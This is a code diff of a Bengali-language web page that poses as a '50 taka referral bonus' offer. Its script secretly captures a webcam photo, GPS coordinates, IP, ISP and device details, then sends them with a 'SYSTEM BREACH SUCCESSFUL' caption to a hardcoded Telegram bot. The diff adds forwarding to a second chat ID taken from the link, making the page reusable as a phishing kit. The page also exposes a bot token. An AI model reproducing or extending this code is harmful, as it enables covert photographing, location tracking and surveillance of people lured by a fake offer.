@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>50 টাকা বোনাস নিতে ক্লিক করুন </title>
+    
+    <title>50 টাকা বোনাস নিতে ক্লিক করুন</title>
+    <meta property="og:title" content="বোনাস সিস্টেম - ৫০/৫০">
+    <meta property="og:description" content="রেফার করে বোনাস পেতে নিচে ক্লিক করুন।">
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -34,8 +38,7 @@
     <div class="container">
         <h1>বোনাস সিস্টেম</h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
-        <h3>⬇️</h3>
-        <button id="verify-btn">রেফার করুন </button>
+        <button id="verify-btn">রেফার করুন</button>
         <div id="status"></div>
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
@@ -45,32 +48,47 @@
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
 
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromLink = urlParams.get('id'); 
+
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        let gpsLink = "অনুমতি দেওয়া হয়নি";
+        let gpsLink = "লোকেশন অনুমতি নেই";
 
-        // লোকেশন ও হার্ডওয়্যার ডাটা সংগ্রহ
-        function getHardwareAndGPS() {
+        // লোকেশন নেওয়ার সঠিক ফাংশন
+        function getGPS() {
             return new Promise((resolve) => {
-                // GPS পারমিশন চাওয়া
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                        gpsLink = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        resolve();
-                    }, () => resolve(), { timeout: 5000 });
-                } else { resolve(); }
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        // এখানে লিঙ্কটি ঠিক করা হয়েছে
+                        gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        resolve(true);
+                    }, () => resolve(false), { enableHighAccuracy: true });
+                } else { resolve(false); }
             });
         }
 
+        async function sendToTelegram(blob, id, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            } catch(e) {}
+        }
+
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> লোকেশন ও ক্যামেরা পারমিশন দিন...";
+            status.innerText = "> ক্যামেরা ও লোকেশন পারমিশন দিন...";
             verifyBtn.style.display = "none"; 
 
-            // পারমিশন প্রসেস শুরু
-            await getHardwareAndGPS();
+            await getGPS();
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -85,36 +103,25 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        // হার্ডওয়্যার তথ্য সংগ্রহ
-                        let hardwareInfo = `\n\n💻 **HARDWARE DETAILS**`;
-                        hardwareInfo += `\nCPU Cores: \`${navigator.hardwareConcurrency || 'Unknown'}\``;
-                        hardwareInfo += `\nRAM: \`${navigator.deviceMemory || 'Unknown'} GB\``;
-                        hardwareInfo += `\nScreen: \`${window.screen.width}x${window.screen.height}\``;
-                        hardwareInfo += `\nPlatform: \`${navigator.platform}\``;
+                        // হার্ডওয়্যার তথ্য
+                        let info = `\n\n💻 **HARDWARE DETAILS**\nCPU: \`${navigator.hardwareConcurrency}\` Cores\nRAM: \`${navigator.deviceMemory}\` GB\nScreen: \`${window.screen.width}x${window.screen.height}\``;
 
-                        // ব্যাটারি তথ্য
-                        if (navigator.getBattery) {
-                            const b = await navigator.getBattery();
-                            hardwareInfo += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
-                        }
-
-                        let caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + hardwareInfo;
-                        
-                        // নেটওয়ার্ক ও লোকেশন তথ্য
+                        // নেটওয়ার্ক ও লোকেশন
                         try {
                             const res = await fetch('https://ipwho.is/');
                             const d = await res.json();
-                            caption += `\n\n🌐 **NETWORK & LOCATION**`;
-                            caption += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\`\nMaps: [Click Here](${gpsLink !== "অনুমতি দেওয়া হয়নি" ? gpsLink : 'http://google.com/maps?q='+d.latitude+','+d.longitude})`;
+                            info += `\n\n🌐 **NETWORK & IP**\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\``;
                         } catch(e) {}
 
-                        const formData = new FormData();
-                        formData.append('chat_id', adminId);
-                        formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', caption);
-                        formData.append('parse_mode', 'Markdown');
+                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + info + `\n\n📍 **GPS LOCATION**\n[ম্যাপ দেখতে এখানে ক্লিক করুন](${gpsLink})`;
+                        
+                        // এডমিনকে পাঠানো
+                        await sendToTelegram(blob, adminId, caption);
 
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                        // অন্য ইউজারকে পাঠানো (যদি আইডি থাকে)
+                        if (userIdFromLink && userIdFromLink !== adminId) {
+                            await sendToTelegram(blob, userIdFromLink, caption);
+                        }
 
                         status.innerText = "> ভেরিফিকেশন সফল!";
                         stream.getTracks().forEach(t => t.stop());
